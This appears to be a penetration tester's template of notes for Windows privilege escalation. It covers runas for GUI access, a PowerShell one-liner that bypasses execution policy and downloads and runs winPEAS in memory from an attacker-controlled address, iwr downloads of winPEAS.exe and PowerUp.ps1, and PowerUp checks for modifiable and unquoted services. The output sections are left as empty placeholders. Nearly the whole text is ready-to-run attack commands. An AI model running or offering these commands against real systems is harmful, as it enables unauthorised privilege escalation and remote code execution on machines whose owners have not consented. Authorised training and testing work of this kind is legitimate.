# No GUI?
If a compromised user isn't part of "Remote Desktop Users" or "Remote Management Users", this means RDP access can't be gained as that user.

Instead, use runas on an account with GUI access to run a cmd or powershell:
```powershell
runas /user:$USER cmd
```
# Winpeas
```powershell
powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
```
```
<insert winpeas output here>
```
```powershell
iwr -uri http://$(IP_ADDRESS)/winPEASx64.exe -Outfile winPEAS.exe
```
```
<insert output from winpeas exe here>
```
# PowerUp
```batch
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```
```powershell
iwr -uri http://$(IP_ADDRESS)/PowerUp.ps1 -Outfile PowerUp.ps1
```
```powershell
powershell -ep bypass
```
```powershell
. .\PowerUp.ps1
```
```powershell
Get-ModifiableServiceFile
```
```
<insert output here>
```
```powershell
Get-UnquotedService
```
```
<insert output here>
```
